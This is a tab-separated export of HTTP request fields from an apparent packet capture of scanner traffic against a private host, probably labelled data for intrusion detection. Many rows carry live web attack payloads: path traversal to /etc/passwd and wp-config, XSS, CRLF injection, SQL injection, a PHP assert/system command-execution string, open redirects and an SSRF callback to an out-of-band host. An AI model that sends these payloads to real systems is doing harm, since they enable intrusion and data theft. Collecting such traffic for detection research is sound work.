http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8	gzip																close		108	108	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web/diag_ping_admin_en.asp	1	http://192.168.1.104/web/boaform/admin/formTracert		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/boaform/admin/formTracert
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/_ignition/scripts/--%3E%3Csvg%20onload=alert%28document.domain%29%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/_ignition/scripts/--%3E%3Csvg%20onload=alert%28document.domain%29%3E
application/json, text/plain, */*	gzip																close		20	20	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/fileDownload?action=downloadBackupFile		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/fileDownload?action=downloadBackupFile
*/*	gzip	en															close		29	29	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/.antproxy.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/.antproxy.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/blog/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=
application/json, text/plain, */*	gzip																close		25	25	application/x-www-form-urlencoded; charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/fileDownload?action=downloadBackupFile		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/fileDownload?action=downloadBackupFile
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/rest/V1/store/storeConfigs		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/rest/V1/store/storeConfigs
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/redirect.php?event1=&event2=&event3=&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/bitrix/redirect.php?event1=&event2=&event3=&goto=https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
*/*	gzip	en															close		49	49	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/api/edr/sangforinter/v2/cssp/slog_client?token=eyJtZDUiOnRydWV9
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/bitrix/redirect.php?event3=352513&goto=https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/bitrix/redirect.php?event3=352513&goto=https://example.com
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/%5chttp://192.168.1.104example.com/%2f%2e%2e		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/%5chttp://192.168.1.104example.com/%2f%2e%2e
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%0DSet-Cookie:crlfinjection=crlfinjection		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/%0DSet-Cookie:crlfinjection=crlfinjection
	gzip																close		140	140	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%0ASet-Cookie:crlfinjection=crlfinjection		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/%0ASet-Cookie:crlfinjection=crlfinjection
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/index.php
*/*	gzip	en															close		56	56	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/lcms/index.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/lcms/index.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/%3F%0DSet-Cookie%3Acrlfinjection=crlfinjection
	gzip																close		148	148	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36				/web/
	gzip																close		139	139	application/json						192.168.1.104															1	http://192.168.1.104/web/		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php/Home/uploadify/fileList?type=.+&path=../../../		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/index.php/Home/uploadify/fileList?type=.+&path=../../../
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e		GET				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/%61%27%22%3e%3c%69%6e%6a%65%63%74%61%62%6c%65%3e
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?id=50&file=../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/index.php?id=50&file=../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/HelpTheHelpDesk.jsdbx		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/HelpTheHelpDesk.jsdbx
	gzip																close		1029	1029	application/xml						192.168.1.104															1	http://192.168.1.104/web/client		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/client
*/*	gzip	en															close		123	123							192.168.1.104															1	http://192.168.1.104/web/xmlrpc.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36				/web/xmlrpc.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")		GET				and extractvalue(1,concat(0x7e,md5(1234567890))) -- a HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=test")
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/downloadfile.php?file=../../../../../../../../../../etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/downloadfile.php?file=../../../../../../../../../../etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
	gzip																close		363	363	application/json						192.168.1.104															1	http://192.168.1.104/web/actuator/env		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/actuator/env
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1944.0 Safari/537.36				/web/wp-content/plugins/tinymce-thumbnail-gallery/php/download-image.php?href=../../../../wp-config.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/interlib/report/ShowImage?localPath=etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/interlib/report/ShowImage?localPath=etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.php.txt		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wp-config.php.txt
	gzip																close		132	132	application/x-www-form-urlencoded						192.168.1.104														192.168.1.104/thruk/cgi-bin/login.cgi?thruk	1	http://192.168.1.104/web/thruk/cgi-bin/login.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/thruk/cgi-bin/login.cgi
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-config.php.bak		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/wp-config.php.bak
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/emergency.php		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36				/web/emergency.php
	gzip																close				application/x-www-form-urlencoded						192.168.1.104														554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:72:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -";s:2:"id";i:1;}	1	http://192.168.1.104/web/user.php?act=login		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/user.php?act=login
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/Grimag/go.php?https://example.com		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/wp-content/themes/Grimag/go.php?https://example.com
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/login/forgetpswd.php?loginsys=1&loginname=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/wordpress-popup/views/admin/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/wp-content/plugins/wordpress-popup/views/admin/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/email-subscribers		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/wp-content/plugins/email-subscribers
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/backup-db/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/wp-content/backup-db/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36				/web/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/plugins/vkeyboard/vkeyboard.php?passformname=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
*/*	gzip																close										192.168.1.104															1	http://192.168.1.104/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8acjap9m8v98g1htghgcekcuoeyyyynq.oast.online%23.salesforce.com/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://c8acjap9m8v98g1htghgcekcuoeyyyynq.oast.online%23.salesforce.com/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/var/resource_config.json		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/var/resource_config.json
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/license.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/license.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wp-content/plugins/woocommerce/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/wp-content/plugins/woocommerce/
	gzip																close		49	49	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/login.php		POST				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/login.php
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/webadmin/reporter/view_server_log.php?server=localhost&act=stats&filename=&offset=1&count=1000&sortorder=&log=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&offset=&sortitem=&filter=
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml
